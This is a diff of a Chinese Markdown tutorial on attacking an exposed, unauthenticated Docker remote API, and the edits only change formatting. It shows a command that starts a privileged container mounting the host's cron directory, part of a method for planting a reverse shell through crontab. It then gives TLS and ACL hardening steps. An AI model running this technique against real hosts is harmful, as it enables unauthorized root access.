@@ -39,7 +39,7 @@ systemctl restart docker
 
 **利用docker容器写定时任务反弹shell**
 
- 我们可以利用未授权访问的docker remote api 开启一个容器并挂载至根目录，由此我们可以获得任意读写的权限，然后我们再将反弹shell命令写入定时任务crontab中，即可使宿主机反弹shell。
+我们可以利用未授权访问的docker remote api 开启一个容器并挂载至根目录，由此我们可以获得任意读写的权限，然后我们再将反弹shell命令写入定时任务crontab中，即可使宿主机反弹shell。
 
 ```
 [root@localhost ~]# docker -H tcp://192.168.32.183:2375 run -it --user root --privileged -v /var/spool/cron/:/var/spool/cron/ alpine sh
@@ -57,20 +57,20 @@ systemctl restart docker
 
 在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：
 
-```basic
+```
 设置ACL，仅允许信任的来源IP连接；
 设置TLS认证，官方的文档为Protect the Docker daemon socket
 ```
 
 客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：
 
-```perl
+```
 docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://10.10.10.10:2375 -H unix:///var/run/docker.sock
 ```
 
 客户端连接时需要设置以下环境变量
 
-```bash
+```
 export DOCKER_TLS_VERIFY=1
 export DOCKER_CERT_PATH=~/.docker
 export DOCKER_HOST=tcp://10.10.10.10:2375
